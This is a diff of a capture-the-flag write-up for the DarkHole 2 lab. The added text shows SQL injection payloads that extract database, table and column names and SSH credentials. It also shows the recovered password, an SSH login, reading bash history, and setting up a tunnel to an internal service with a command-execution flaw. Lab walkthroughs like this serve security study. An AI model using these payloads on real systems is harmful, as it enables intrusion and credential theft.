@@ -107,13 +107,55 @@ We noticed columns 2, 3, 5, and 6 are reflected in the user interface, indicatin
 We also found database name out by entering the following Sql command.
 
     id=' UNION SELECT1,GROUP_CONCAT(schema_name),3,4,5,6 FROM information_schema.schemata-- -
-    <img width="717" height="506" alt="image" src="https://github.com/user-attachments/assets/562a87e7-7270-419a-b484-73d85897fcd0" />
+
+<img width="717" height="506" alt="image" src="https://github.com/user-attachments/assets/562a87e7-7270-419a-b484-73d85897fcd0" />
 
     
 To list and display the tables of the ‘darkhole_2’ database: 
 
     id=' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema='darkhole_2'-- -
-    <img width="717" height="506" alt="image" src="https://github.com/user-attachments/assets/77ff648a-2c14-4f23-8159-adda1dc1d5ff" />
 
+<img width="717" height="506" alt="image" src="https://github.com/user-attachments/assets/77ff648a-2c14-4f23-8159-adda1dc1d5ff" />
 
+# SSH Access
 
+Upon trying, we were able to see there is a table called ‘ssh’, We now needed to find the column names of the table:
+
+    id=' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name='ssh'-- - 
+
+<img width="766" height="501" alt="image" src="https://github.com/user-attachments/assets/300b59f0-6b55-4d4e-998f-b90f4a50071a" />
+
+Tried extracting more information from the ‘ssh’ table for the user credentials:
+
+    id=' UNION SELECT 1,user,pass,4,5,6 FROM ssh – -
+
+<img width="765" height="501" alt="image" src="https://github.com/user-attachments/assets/ded242f8-303d-4461-a604-75d6be90f3a3" />
+Found credential user ‘jehad’ using the password ‘fool’.
+
+We tried authenticating as the user ‘jehad’ using the password ‘fool’. 
+SSH Login via Reused Credentials
+
+    ssh jehad@192.168.139.143
+<img width="805" height="462" alt="image" src="https://github.com/user-attachments/assets/f26916e4-8217-4dfb-80c2-4749470d05d0" />
+
+We checked for bash history of the user:johad:
+
+    cat ~/.bash_history 
+
+<img width="805" height="531" alt="image" src="https://github.com/user-attachments/assets/2ef0d893-d60e-44f6-b91e-809309cbfbee" />
+Here, we saw a bunch of web requests that had been made to this local port and something already running on localhost:port 9999. 
+
+Exposed Internal Web Service on Port 9999
+We started looking at the web-related files:
+
+cat /opt/web/index.php 
+<img width="610" height="346" alt="image" src="https://github.com/user-attachments/assets/0203e110-7cb2-49b0-bf25-2e8a63e696f4" />
+
+We came across a code in the ‘index.php’ file that would allow us to do remote command execution on the web page url. 
+
+Remote Code Execution via cmd Parameter
+We created a ssh tunnel between our local machine and the remote server.
+
+    ssh -L 9999:127.0.0.1:9999 jehad@192.168.139.143 
+
+<img width="785" height="639" alt="image" src="https://github.com/user-attachments/assets/dfc475bd-a2ef-42f4-94ca-49c17ffba8d7" />
